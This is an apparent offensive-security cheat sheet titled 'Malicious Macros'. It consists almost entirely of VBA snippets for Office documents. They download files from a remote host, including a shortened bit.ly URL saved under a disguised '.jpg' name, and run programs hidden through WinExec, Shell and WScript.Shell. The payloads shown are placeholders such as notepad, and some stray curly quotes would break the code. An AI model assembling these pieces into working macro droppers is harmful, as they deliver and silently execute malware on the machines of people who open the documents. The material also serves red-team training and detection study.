## Malicious Macros

-  We can make use of VBA code, COM objects, OLE automation, and Win32 APIs to explore the host, access the filesystem, and run commands.

```
Declare PtrSafe Function GetPID _
    Lib "kernel32" _
    Alias “GetProcessId” ( _
        ByVal hProcess As LongPtr _
    ) _
    As Long
```

- Urlmon exposes the easy-to-use function: UrlDownloadToFileA.

```
Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
    ByVal pCaller As LongPtr, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As Long, _
    ByVal lpfnCB As LongPtr _
) As Long

Sub DownloadFile()
     URLDownloadToFileA 0, "https://192.168.10.10/Hello.txt", "Hello.txt", 0, 0
End Sub
```

- COM object: XMLHTTP. XMLHTTP is part of Microsoft’s suite of XML DOM components. The ADODB stream object is used to represent a stream of data or text.

```
Sub DownloadFile()
    Set objXMLHTTP = CreateObject("Microsoft.XMLHTTP")
    Set objADODBStream = CreateObject("ADODB.Stream")
    objXMLHTTP.Open "GET", "https://bit.ly/2B1GCyQ", False
    objXMLHTTP.Send
    objADODBStream.Type = 1
    objADODBStream.Open
    objADODBStream.Write objXMLHTTP.responseBody
    objADODBStream.savetofile "ts.jpg", 2
End Sub
```
- Win32 API calls to run a program. Probably the simplest function for starting a program is WinExec.

```
Declare Function WinExec Lib "kernel32" ( _
     ByVal lpCmdLine As String, _
     ByVal nCmdShow As Long _
) As Long

Const SHOW_HIDE As Long = 0

Sub ExecuteFile ()
     WinExec "C:\Windows\System32\notepad.exe", SHOW_HIDE
End Sub
```

- Execute a program using the Shell command built into VBA itself.

```
Sub ExecuteFile ()
    Shell "C:\Windows\System32\notepad.exe", vbHide
End Sub
```

- Windows Script provides a Wscript.Shell object, which in turn provides a Run method. 

```
Sub ExecuteFile ()
    Set objWscriptShell = CreateObject(“WScript.Shell”)
    objWscriptShell.Run “C:\Windows\System32\notepad.exe", 0
End Sub
```
